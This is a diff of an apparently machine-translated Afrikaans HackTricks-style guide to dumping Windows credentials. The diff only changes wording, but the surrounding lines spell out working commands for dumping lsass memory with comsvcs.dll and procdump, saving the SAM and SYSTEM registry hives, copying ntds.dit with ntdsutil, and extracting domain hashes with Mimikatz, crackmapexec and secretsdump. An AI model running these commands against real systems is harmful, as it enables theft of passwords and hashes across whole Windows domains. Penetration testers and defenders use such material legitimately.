@@ -41,7 +41,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Geloofsbriewe met Meterpreter
 
-Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **te soek na wagwoorde en hashes** binne die slagoffer.
+Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **wagwoorde en hashes** binne die slagoffer te **soek**.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -91,8 +91,8 @@ Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/s
 ### Dumping lsass met **comsvcs.dll**
 
 'n DLL genaamd **comsvcs.dll** wat in `C:\Windows\System32` gevind word, is verantwoordelik vir **dumping prosesgeheue** in die geval van 'n ongeluk. Hierdie DLL sluit 'n **funksie** genaamd **`MiniDumpW`** in, wat ontwerp is om aangeroep te word met `rundll32.exe`.\
-Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **vol**. Geen alternatiewe opsies bestaan nie.\
-Wanneer hierdie drie komponente ontleed word, word die DLL betrokke by die skep van die dump-lêer en die oordrag van die gespesifiseerde proses se geheue na hierdie lêer.\
+Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **volledig**. Geen alternatiewe opsies bestaan nie.\
+Wanneer hierdie drie komponente ontleed word, word die DLL betrokke by die skep van die dump-lêer en die oordrag van die gespesifiseerde proses se geheue in hierdie lêer.\
 Die gebruik van die **comsvcs.dll** is haalbaar vir die dumping van die lsass-proses, wat die behoefte om procdump op te laai en uit te voer, uitskakel. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Die volgende opdrag word gebruik vir uitvoering:
@@ -105,12 +105,12 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 1. Regsklik op die Taakbalk en klik op Taakbestuurder
 2. Klik op Meer besonderhede
-3. Soek vir "Plaaslike Sekuriteitsowerheid Proses" proses in die Prosesse-oortjie
-4. Regsklik op "Plaaslike Sekuriteitsowerheid Proses" proses en klik op "Skep dump-lêer".
+3. Soek vir "Local Security Authority Process" proses in die Prosesse-oortjie
+4. Regsklik op "Local Security Authority Process" proses en klik op "Skep dump-lêer".
 
 ### Dumping lsass met procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binêre wat 'n deel is van [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-onderteken binêre wat 'n deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
@@ -150,17 +150,17 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Wys die pwdLastSet attribuut vir elke NTDS.dit rekening
+### Wys die pwdLastSet-attribuut vir elke NTDS.dit-rekening
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 ## Stealing SAM & SYSTEM
 
-Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan dit nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.
+Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.
 
 ### From Registry
 
-Die maklikste manier om daardie lêers te steel, is om 'n kopie van die register te kry:
+Die maklikste manier om daardie lêers te steel, is om 'n kopie van die registrasie te kry:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
@@ -205,19 +205,19 @@ Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/Powe
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Active Directory Kredensiale - NTDS.dit**
+## **Aktiewe Gids Kredensiale - NTDS.dit**
 
-Die **NTDS.dit** lêer is bekend as die hart van **Active Directory**, wat belangrike data oor gebruikersobjekte, groepe en hul lidmaatskap bevat. Dit is waar die **wagwoord hashes** vir domein gebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.
+Die **NTDS.dit** lêer is bekend as die hart van **Aktiewe Gids**, wat belangrike data oor gebruikersobjekte, groepe en hul lidmaatskap bevat. Dit is waar die **wagwoord hashes** vir domein gebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.
 
-Binne hierdie databasis word drie primêre tabelle gehandhaaf:
+Binne hierdie databasis word drie primêre tabelle onderhou:
 
 - **Data Tabel**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objektes soos gebruikers en groepe.
-- **Link Tabel**: Dit hou die verhouding, soos groep lidmaatskappe, dop.
+- **Link Tabel**: Dit hou die verhouding, soos groep lidmaatskap, dop.
 - **SD Tabel**: **Sekuriteitsbeskrywings** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoor objektes verseker.
 
 Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Dan kan **gedeelte** van die **NTDS.dit** lêer **binne die `lsass`** geheue geleë wees (jy kan die nuutste toeganklike data vind waarskynlik as gevolg van die prestasie verbetering deur 'n **cache** te gebruik).
+Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Dan kan **gedeelte** van die **NTDS.dit** lêer **binne die `lsass`** geheue geleë wees (jy kan die laaste toeganklike data vind waarskynlik as gevolg van die prestasie verbetering deur 'n **cache** te gebruik).
 
 #### Ontsleuteling van die hashes binne NTDS.dit
 
@@ -227,7 +227,7 @@ Die hash is 3 keer versleuteld:
 2. Ontsleutel die **hash** met **PEK** en **RC4**.
 3. Ontsleutel die **hash** met **DES**.
 
-**PEK** het die **selfde waarde** in **elke domeinbeheerder**, maar dit is **versleuteld** binne die **NTDS.dit** lêer met die **BOOTKEY** van die **SISTEEM lêer van die domeinbeheerder (is verskillend tussen domeinbeheerders)**. Dit is hoekom jy die kredensiale van die NTDS.dit lêer moet kry **jy het die lêers NTDS.dit en SISTEEM nodig** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** het die **selfde waarde** in **elke domeinbeheerder**, maar dit is **versleuteld** binne die **NTDS.dit** lêer met die **BOOTKEY** van die **SISTEEM lêer van die domeinbeheerder (is verskillend tussen domeinbeheerders)**. Dit is waarom jy die kredensiale van die NTDS.dit lêer moet kry **jy het die lêers NTDS.dit en SISTEEM nodig** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Kopieer NTDS.dit met Ntdsutil
 
@@ -237,7 +237,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
 You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
 
-### **Onthou van hashes uit NTDS.dit**
+### **Onttrekking van hashes uit NTDS.dit**
 
 Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
 ```bash
@@ -257,7 +257,7 @@ NTDS-objekte kan na 'n SQLite-databasis onttrek word met [ntdsdotsqlite](https:/
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Die `SYSTEM` hive is opsioneel maar laat toe vir die ontsleuteling van geheime (NT & LM hashes, aanvullende akrediteerbare soos duidelike teks wagwoorde, kerberos of vertrou sleutels, NT & LM wagwoord geskiedenisse). Saam met ander inligting, word die volgende data onttrek: gebruiker en masjien rekeninge met hul hashes, UAC vlae, tydstempel vir laaste aanmelding en wagwoord verandering, rekening beskrywing, name, UPN, SPN, groepe en rekursiewe lede, organisatoriese eenhede boom en lidmaatskap, vertroude domeine met vertroue tipe, rigting en eienskappe...
+Die `SYSTEM` hive is opsioneel, maar laat toe vir die ontsleuteling van geheime (NT & LM hashes, aanvullende akrediteerbare soos duidelike teks wagwoorde, kerberos of vertrou sleutels, NT & LM wagwoord geskiedenisse). Saam met ander inligting, word die volgende data onttrek: gebruiker en masjien rekeninge met hul hashes, UAC vlae, tydstempel vir laaste aanmelding en wagwoord verandering, rekening beskrywing, name, UPN, SPN, groepe en rekursiewe lede, organisatoriese eenhede boom en lidmaatskap, vertroude domeine met vertroue tipe, rigting en eienskappe...
 
 ## Lazagne
 
@@ -292,7 +292,7 @@ Laai dit af van: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco
 
 ## Verdedigings
 
-[**Leer hier oor sommige kredensiaal beskermings.**](credentials-protections.md)
+[**Leer meer oor sommige kredensiaal beskermings hier.**](credentials-protections.md)
 
 {% hint style="success" %}
 Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
